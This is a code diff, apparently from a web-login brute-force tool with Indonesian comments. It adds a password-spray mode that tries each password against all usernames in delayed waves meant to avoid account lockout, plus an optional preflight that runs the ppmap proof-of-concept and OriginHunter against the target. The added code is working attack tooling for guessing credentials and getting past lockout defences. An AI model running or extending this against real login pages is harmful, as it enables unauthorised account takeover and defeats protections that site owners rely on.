@@ -353,6 +353,16 @@ def main():
     parser.add_argument('--session-reset', type=int, default=50)
     parser.add_argument('--resume', action='store_true')
     parser.add_argument('--confirm-authorized', action='store_true')
+
+    parser.add_argument('--spray', action='store_true',
+                        help='Password spray mode: tiap password ke SEMUA username '
+                             '(wave + delay panjang, anti-lockout)')
+    parser.add_argument('--spray-wave-delay', type=float, default=1800.0,
+                        help='Jeda antar wave spray (detik, default 1800)')
+    parser.add_argument('--spray-inter-delay', type=float, default=15.0,
+                        help='Jeda antar attempt dalam wave (detik, default 15)')
+    parser.add_argument('--chaining', action='store_true',
+                        help='Preflight chaining: ppmap --poc + OriginHunter (opsional)')
     parser.add_argument('--verbose', action='store_true')
     parser.add_argument('--silent', action='store_true')
 
@@ -373,6 +383,56 @@ def main():
     if not args.post:
         log_output("[!] --post is required.", level='normal')
         sys.exit(1)
+
+    # [v2.2] parent path untuk chaining/spray (repo-root modules)
+    _PARENT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    if _PARENT not in sys.path:
+        sys.path.insert(0, _PARENT)
+
+    # [v2.2] Chaining preflight (opsional)
+    if getattr(args, 'chaining', False):
+        try:
+            from chaining import preflight_summary
+            pf = preflight_summary(args.url, do_ppmap=True, do_originhunter=True)
+            for n in pf.get('notes', []):
+                log_output(f"[chaining] {n}", level='normal')
+        except Exception as e:
+            log_output(f"[chaining] preflight gagal (non-fatal): {e}", level='normal')
+
+    # [v2.2] Password spray mode (1 password -> N users, anti-lockout)
+    if getattr(args, 'spray', False):
+        try:
+            from spray import spray_attack
+            users, passwords = read_wordlist(args.userlist), read_wordlist(args.passlist)
+            log_output(f"[*] SPRAY MODE: {len(passwords)} password x {len(users)} users | "
+                       f"wave_delay={args.spray_wave_delay}s inter_delay={args.spray_inter_delay}s",
+                       level='normal')
+            session_holder = {'s': create_new_session()}
+
+            def _attempt(u, pwd):
+                # brute_force_attempt mengelola logging & pattern sendiri;
+                # kita hanya perlu boolean sukses utk spray engine.
+                resp = brute_force_attempt(
+                    session_holder['s'], args.url, u, pwd, args.post,
+                    args.success, getattr(args, 'failure', None),
+                    0, len(users) * len(passwords), args.timeout, 3,
+                    getattr(args, 'session_reset', 0))
+                return {'success': bool(resp)}
+
+            summary = spray_attack(args.url, users, passwords, _attempt,
+                                   wave_delay=args.spray_wave_delay,
+                                   inter_delay=args.spray_inter_delay,
+                                   log=lambda m: log_output(m, level='normal'))
+            log_output(f"[+] Spray selesai: {summary['attempts']} attempts, "
+                       f"{len(summary['hits'])} hit(s), {summary['waves']} wave(s)",
+                       level='normal')
+            return
+        except KeyboardInterrupt:
+            log_output("[!] Spray dihentikan user.", level='normal')
+            return
+        except Exception as e:
+            log_output(f"[-] Spray gagal: {e}", level='normal')
+            return
 
     brute_force_attack(args.url, args.userlist, args.passlist, args.post, args.success, args.failure,
                        args.threads, args.timeout, args.delay, args.resume, args.otp_mode, args.otp_length, args.session_reset)
